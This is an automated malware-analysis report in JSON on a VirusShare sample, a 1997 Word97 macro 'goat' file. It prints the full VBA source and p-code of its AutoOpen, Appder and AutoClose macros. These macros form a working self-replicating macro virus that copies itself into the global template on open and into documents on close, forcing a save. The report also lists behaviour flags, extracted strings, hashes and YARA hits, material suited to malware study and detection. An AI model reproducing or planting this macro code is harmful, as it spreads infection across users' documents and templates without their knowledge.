{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"AutoOpen\"",
            "Attribute VB_Name = \"Appder\"",
            "Attribute VB_Name = \"AutoClose\""
        ],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code"
        },
        "macro": "\n\n\nPublic Sub MAIN()\nDim iMacroCount\nDim i\nDim AClose\nDim Ad\nDim sMe$\nDim sMacro$\nOn Error GoTo -1: On Error GoTo Quit\niMacroCount = WordBasic.CountMacros(0, 0)\nFor i = 1 To iMacroCount\n    If WordBasic.[MacroName$](i, 0, 0) = \"         \" Then\n        AClose = -1\n    End If\n    If WordBasic.[MacroName$](i, 0, 0) = \"Appder\" Then\n        Ad = -1\n    End If\nNext i\nIf Not AClose And Not Ad Then\n    sMe$ = WordBasic.[FileName$]()\n    sMacro$ = sMe$ + \":Appder\"\n    WordBasic.MacroCopy sMacro$, \"Global:Appder\"\n    sMacro$ = sMe$ + \":AutoClose\"\n    WordBasic.MacroCopy sMacro$, \"Global:AutoClose\"\nEnd If\nQuit:\nEnd Sub\n\n\n\nPublic Sub MAIN()\nDim iMacroCount\nDim i\nDim AClose\nDim Ad\nDim sMe$\nDim sMacro$\nOn Error GoTo -1: On Error GoTo Quit\niMacroCount = WordBasic.CountMacros(0, 0)\nFor i = 1 To iMacroCount\n    If WordBasic.[MacroName$](i, 0, 0) = \"         \" Then\n        AClose = -1\n    End If\n    If WordBasic.[MacroName$](i, 0, 0) = \"Appder\" Then\n        Ad = -1\n    End If\nNext i\nIf Not AClose And Not Ad Then\n    sMe$ = WordBasic.[FileName$]()\n    sMacro$ = sMe$ + \":Appder\"\n    WordBasic.MacroCopy sMacro$, \"Global:Appder\"\n    sMacro$ = sMe$ + \":AutoClose\"\n    WordBasic.MacroCopy sMacro$, \"Global:AutoClose\"\nEnd If\nQuit:\nEnd Sub\n\n\n\n\nPublic Sub MAIN()\nDim sMe$\nDim sTMacro$\nDim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)\nOn Error GoTo -1: On Error GoTo Quit\nWordBasic.CurValues.FileSaveAs dlg\nIf dlg.Format = 0 Then dlg.Format = 1\nsMe$ = WordBasic.[FileName$]()\nsTMacro$ = sMe$ + \":AutoOpen\"\nWordBasic.MacroCopy \"Global:Appder\", sTMacro$\nsTMacro$ = sMe$ + \":Appder\"\nWordBasic.MacroCopy \"Global:Appder\", sTMacro$\nsTMacro$ = sMe$ + \":AutoClose\"\nWordBasic.MacroCopy \"Global:AutoClose\", sTMacro$\nWordBasic.FileSaveAs dlg\nGoTo Done\nQuit:\nIf Err.Number <> 102 Then\n    WordBasic.FileSaveAs dlg\nEnd If\nDone:\nEnd Sub\n\n' Processing file: VirusShare_2c1df84b4d173f2dfadb8f906e1504bf\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 965 bytes\n' Macros/VBA/AutoOpen - 1967 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Public Sub MAIN())\n' Line #2:\n' \tDim \n' \tVarDefn iMacroCount\n' Line #3:\n' \tDim \n' \tVarDefn i\n' Line #4:\n' \tDim \n' \tVarDefn AClose\n' Line #5:\n' \tDim \n' \tVarDefn Ad\n' Line #6:\n' \tDim \n' \tVarDefn sMe\n' Line #7:\n' \tDim \n' \tVarDefn sMacro\n' Line #8:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError Quit \n' Line #9:\n' \tLitDI2 0x0000 \n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd CountMacros 0x0002 \n' \tSt iMacroCount \n' Line #10:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd iMacroCount \n' \tFor \n' Line #11:\n' \tLd i \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd [MacroName$] 0x0003 \n' \tLitStr 0x0009 \"         \"\n' \tEq \n' \tIfBlock \n' Line #12:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tSt AClose \n' Line #13:\n' \tEndIfBlock \n' Line #14:\n' \tLd i \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd [MacroName$] 0x0003 \n' \tLitStr 0x0006 \"Appder\"\n' \tEq \n' \tIfBlock \n' Line #15:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tSt Ad \n' Line #16:\n' \tEndIfBlock \n' Line #17:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #18:\n' \tLd AClose \n' \tNot \n' \tLd Ad \n' \tNot \n' \tAnd \n' \tIfBlock \n' Line #19:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tSt sMe$ \n' Line #20:\n' \tLd sMe$ \n' \tLitStr 0x0007 \":Appder\"\n' \tAdd \n' \tSt sMacro$ \n' Line #21:\n' \tLd sMacro$ \n' \tLitStr 0x000D \"Global:Appder\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #22:\n' \tLd sMe$ \n' \tLitStr 0x000A \":AutoClose\"\n' \tAdd \n' \tSt sMacro$ \n' Line #23:\n' \tLd sMacro$ \n' \tLitStr 0x0010 \"Global:AutoClose\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #24:\n' \tEndIfBlock \n' Line #25:\n' \tLabel Quit \n' Line #26:\n' \tEndSub \n' Macros/VBA/Appder - 1960 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Public Sub MAIN())\n' Line #2:\n' \tDim \n' \tVarDefn iMacroCount\n' Line #3:\n' \tDim \n' \tVarDefn i\n' Line #4:\n' \tDim \n' \tVarDefn AClose\n' Line #5:\n' \tDim \n' \tVarDefn Ad\n' Line #6:\n' \tDim \n' \tVarDefn sMe\n' Line #7:\n' \tDim \n' \tVarDefn sMacro\n' Line #8:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError Quit \n' Line #9:\n' \tLitDI2 0x0000 \n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd CountMacros 0x0002 \n' \tSt iMacroCount \n' Line #10:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd iMacroCount \n' \tFor \n' Line #11:\n' \tLd i \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd [MacroName$] 0x0003 \n' \tLitStr 0x0009 \"         \"\n' \tEq \n' \tIfBlock \n' Line #12:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tSt AClose \n' Line #13:\n' \tEndIfBlock \n' Line #14:\n' \tLd i \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd [MacroName$] 0x0003 \n' \tLitStr 0x0006 \"Appder\"\n' \tEq \n' \tIfBlock \n' Line #15:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tSt Ad \n' Line #16:\n' \tEndIfBlock \n' Line #17:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #18:\n' \tLd AClose \n' \tNot \n' \tLd Ad \n' \tNot \n' \tAnd \n' \tIfBlock \n' Line #19:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tSt sMe$ \n' Line #20:\n' \tLd sMe$ \n' \tLitStr 0x0007 \":Appder\"\n' \tAdd \n' \tSt sMacro$ \n' Line #21:\n' \tLd sMacro$ \n' \tLitStr 0x000D \"Global:Appder\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #22:\n' \tLd sMe$ \n' \tLitStr 0x000A \":AutoClose\"\n' \tAdd \n' \tSt sMacro$ \n' Line #23:\n' \tLd sMacro$ \n' \tLitStr 0x0010 \"Global:AutoClose\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #24:\n' \tEndIfBlock \n' Line #25:\n' \tLabel Quit \n' Line #26:\n' \tEndSub \n' Macros/VBA/AutoClose - 1857 bytes\n' Line #0:\n' Line #1:\n' Line #2:\n' \tFuncDefn (Public Sub MAIN())\n' Line #3:\n' \tDim \n' \tVarDefn sMe\n' Line #4:\n' \tDim \n' \tVarDefn sTMacro\n' Line #5:\n' \tDim \n' \tVarDefn dlg (As Object)\n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd FileSaveAs 0x0001 \n' \tSet dlg \n' Line #6:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError Quit \n' Line #7:\n' \tLd dlg \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #8:\n' \tLd dlg \n' \tMemLd Format$ \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tLd dlg \n' \tMemSt Format$ \n' \tEndIf \n' Line #9:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tSt sMe$ \n' Line #10:\n' \tLd sMe$ \n' \tLitStr 0x0009 \":AutoOpen\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #11:\n' \tLitStr 0x000D \"Global:Appder\"\n' \tLd sTMacro$ \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #12:\n' \tLd sMe$ \n' \tLitStr 0x0007 \":Appder\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #13:\n' \tLitStr 0x000D \"Global:Appder\"\n' \tLd sTMacro$ \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #14:\n' \tLd sMe$ \n' \tLitStr 0x000A \":AutoClose\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #15:\n' \tLitStr 0x0010 \"Global:AutoClose\"\n' \tLd sTMacro$ \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #16:\n' \tLd dlg \n' \tLd WordBasic \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #17:\n' \tGoTo Done \n' Line #18:\n' \tLabel Quit \n' Line #19:\n' \tLd Err \n' \tMemLd Number \n' \tLitDI2 0x0066 \n' \tNe \n' \tIfBlock \n' Line #20:\n' \tLd dlg \n' \tLd WordBasic \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #21:\n' \tEndIfBlock \n' Line #22:\n' \tLabel Done \n' Line #23:\n' \tEndSub \n"
    },
    "filename": "VirusShare_2c1df84b4d173f2dfadb8f906e1504bf",
    "filesize": 36864,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: This is a Word97 macro goat file,  1997 by Costin RAIU craiu@gecad, Author: Costin RAIU, Template: Normal, Last Saved By: Costin Raiu, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Fri Jul 30 17:14:00 1999, Last Saved Time/Date: Fri Jul 30 17:14:00 1999, Number of Pages: 1, Number of Words: 77, Number of Characters: 440, Security: 0",
    "hashes": {
        "md5": "2c1df84b4d173f2dfadb8f906e1504bf",
        "sha1": "155f0537518e18909d054c7c83f987b022e9a0ce",
        "sha256": "9a38c237a98946e1450b6f07a5b3b1958ff3841c861c67c14e1eb7792945b18d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjBB",
            "This is a Word97 macro goat file,  1997 by Costin RAIU ",
            " HYPERLINK \"mailto:craiu@gecad.ro\" ",
            "craiu@gecad.ro",
            "Reproduction of any part of this document is prohibited without the permission from the author.",
            "12345678901234567890123456789012345678901234567890123456789012345678901234567890",
            "12345678901234567890123456789012345678901234567890123456789012345678901234567890",
            "12345678901234567890123456789012345678901234567890123456789012345678901234567890",
            "12345678901234567890123456789012345678901234567890123456789012345678901234567890",
            "Text box !!! (embedded control)",
            "/ =!",
            "This is a Word97 macro goat file,  1997 by Costin RAIU craiu@gecad",
            "Costin RAIU",
            "Normal",
            "Costin Raiu",
            "Microsoft Word 8.0",
            "RSN\\|/",
            "This is a Word97 macro goat file,  1997 by Costin RAIU craiu@gecad",
            "Title",
            "_PID_GUID",
            "_PID_HLINKS",
            "0%\t\u06be",
            "0%\t\u06be",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "Basi(",
            "         ",
            "Appder",
            ":Appder",
            "Global:Appder",
            ":AutoClose",
            "Global:AutoClose ",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oOpen\"",
            "Public",
            " Sub MAI",
            " iMacroC0ount",
            "ACPlose",
            "s8Me$",
            " Error G",
            "oTo -1: q",
            "ordBasic",
            "s(0, *0",
            "$](i",
            "\" Then",
            "End I",
            "-Appde",
            "*Next",
            ",Not ",
            " mFile",
            "+ <\":",
            ", \"GlobalK",
            " GoTP(",
            "= WoP*",
            "0, 0(",
            "         ",
            "Appder",
            ":Appder",
            "Global:Appder",
            ":AutoClose",
            "Global:AutoClose ",
            "Attribut",
            "e VB_Nam",
            "e = \"App",
            "der\"",
            "Public S",
            "ub MAIN(",
            "Dim i",
            "MacroCou",
            "AClo",
            "On E",
            "rror GoT@o -1: ",
            "WordBasic.",
            "s(0, 0",
            "$](i",
            "\" The8n",
            "End If",
            "*Nex t i",
            ",Not ",
            "d! mFile",
            "+x \":",
            "opy ",
            ", \"GlobalK",
            "utoB~'",
            ":AutoOpen",
            "Global:Appder",
            ":Appder",
            "Global:Appder",
            ":AutoClose",
            "Global:AutoClose  <",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oClose\"",
            "Public",
            " Sub MAI",
            "Dim  sMe$",
            "acro",
            " As Obje",
            "ct: Set ",
            "$= WordB",
            "asic.Dia@logRec",
            "FileSave",
            "As(False",
            "^On Erro",
            "r GoTo -",
            "Quit",
            "OCurVa0lues",
            ".Form",
            "0 Then",
            "$]wspC",
            "+ \":",
            "O8pen",
            "py \"Glob",
            "al:Appder\", !6&",
            "BcDone4",
            "A`:W",
            "umber <>",
            " 102BX",
            "End If",
            "q\u03e17\t",
            "f37a1cf71",
            "1037a1cf71",
            "1137a1cf71",
            "1237a1cf71",
            "Wordk",
            "Win16~",
            "Win32",
            "GOAT97-1T",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Module1b",
            "Appder",
            "MAIN,",
            "iMacroCount^",
            "AClose",
            "Ad~\\",
            "sMacro",
            "Quit9",
            "WordBasic",
            "CountMacros",
            "MacroName$",
            "FileName$m",
            "MacroCopyE",
            "AutoOpen*",
            "AutoClose",
            "sTMacro",
            "dlg-",
            "DialogRecord",
            "FileSaveAs",
            "CurValues\u0224",
            "Done",
            "Erro",
            "Number-",
            "Documentj",
            "Project",
            "q\u03e17\t",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#D:",
            "\\WINNT\\S",
            "ystem32\\",
            "StdOle2.",
            "Tlb#OLE ",
            "Automati,on",
            "Forms>",
            "FFE52",
            "14D1-3D5",
            "A-11D3-9",
            "F21CD0277C",
            "WD#Microsoft ",
            " Libprary",
            "514E83-45D8",
            "P825",
            "TEMP\\VBE",
            "\\&EX&.E",
            "CvOPfficDvO@sf",
            "cBv*~*",
            "DF8D04C-",
            "S01B-HBDE*AA@u4",
            "Sgram",
            " Files\\o1",
            "0O9`7.DLLHV",
            " (8.0V",
            "isDocument",
            "h@4s",
            "Openb",
            "AAppder",
            "bpoe",
            "`kClose",
            "C`|o",
            "ThisDocument",
            "AutoOpen",
            "Appder",
            "AutoClose",
            "ID=\"{DB571436-4699-11D3-982B-000021CD277C}\"",
            "Document=ThisDocument/&H00000000",
            "Module=AutoOpen",
            "Module=Appder",
            "Module=AutoClose",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"A0A2333137313731373137\"",
            "DPB=\"2B29B8374238423842\"",
            "GC=\"B6B425CC3BDCC7DDC7DD38\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {
            "String too long": [
                "12345678901234567890123456789012345678901234567890123456789012345678901234567890"
            ]
        },
        "ip": [],
        "url": []
    },
    "time": "0:00:00.315108",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
